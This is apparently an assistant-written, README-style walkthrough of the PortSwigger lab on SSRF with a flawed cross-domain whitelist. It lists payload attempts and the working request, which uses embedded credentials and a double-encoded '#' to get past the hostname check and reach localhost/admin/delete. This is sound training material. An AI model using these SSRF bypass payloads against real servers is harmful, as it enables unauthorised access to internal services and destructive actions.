Great catch, Kaouthar! 🕵️‍♀️
You’re working on the advanced SSRF lab:

🎯 **Lab: SSRF with flawed cross-domain whitelist**
This lab involves **bypassing a flawed URL parser** that validates only the **hostname**, not the **actual target IP**.

---

Here's the breakdown + full **README-style explanation** based on your Burp request and the PortSwigger solution 👇

---

# README — SSRF with Flawed Cross-Domain Whitelist

---

## 🧠 Overview

This lab contains a **server-side request forgery (SSRF)** vulnerability. The server whitelists trusted domains like `stock.weliketoshop.net`, but applies the validation **improperly** by only inspecting the **hostname** portion of the URL.

Your goal is to **bypass the whitelist**, target `localhost`, and trigger an internal action by exploiting how **URL parsers treat embedded credentials and ports**.

---

## 🎯 Objective

* Bypass hostname validation and access the internal admin interface.
* Use SSRF to send a request to:

  ```
  http://localhost/admin/delete?username=carlos
  ```
* Solve the lab by deleting the user `carlos`.

---

## 🧪 Tools

* Burp Suite (Proxy + Repeater)
* Knowledge of:

  * URL parsing behavior
  * Embedded credentials in URLs (`user@host`)
  * Double URL encoding tricks

---

## 🚀 Exploitation Steps

### 1. ⛔ Try a basic internal URL

```http
stockApi=http://127.0.0.1/admin/delete?username=carlos
```

🛑 Rejected — the whitelist blocks it.

---

### 2. ✅ Use a whitelisted domain with credentials

```http
stockApi=http://username@stock.weliketoshop.net/
```

✅ Accepted — this proves the parser only checks `hostname` and allows embedded credentials.

---

### 3. ⛔ Try adding `#` in the username

```http
stockApi=http://localhost@stock.weliketoshop.net#@evil.com/
```

🛑 Rejected — URL parsing likely terminates at the fragment.

---

### 4. 🧠 Double encode the `#` (payload trick)

```http
http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

✅ This tricks the URL parser:

* `80%2523` becomes:

  * `%25` = `%`
  * `%2523` → `%23` → `#`
* Final parsed URL:

  ```http
  http://localhost:80#@stock.weliketoshop.net/
  ```

👀 The server **thinks the host is `stock.weliketoshop.net`**, but connects to **`localhost`**, which is before the `@`.

---

### 5. 📌 Final Working Request

```http
POST /product/stock HTTP/2
Host: <lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

📸 Screenshot placeholder: 
![ssrf](https://github.com/Kabilala/ssrf/blob/main/lab7/lab7.png)

✅ If the SSRF is successful, the internal endpoint is triggered and the user `carlos` is deleted. The lab is marked as solved.
